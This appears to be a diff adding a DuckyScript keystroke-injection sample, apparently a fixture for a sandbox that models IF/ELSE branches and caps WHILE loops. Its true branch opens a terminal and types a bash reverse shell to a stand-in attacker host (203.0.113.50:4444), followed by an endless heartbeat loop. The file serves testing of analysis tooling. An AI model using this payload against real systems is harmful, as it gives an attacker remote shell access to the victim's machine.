@@ -1,0 +1,22 @@
+REM Linux reverse-shell payload. Demonstrates IF/ELSE branch modelling and
+REM WHILE-loop iteration capping in the sandbox.
+DELAY 1000
+
+IF (1 == 1) THEN
+    REM Open a terminal and connect a shell back to the attacker.
+    CTRL ALT t
+    DELAY 1000
+    STRING bash -i >& /dev/tcp/203.0.113.50/4444 0>&1
+    ENTER
+ELSE
+    REM Fallback branch if no terminal shortcut is available.
+    STRING echo "no terminal"
+    ENTER
+END_IF
+
+DELAY 500
+WHILE (1 == 1)
+    STRING echo heartbeat
+    ENTER
+    DELAY 500
+END_WHILE
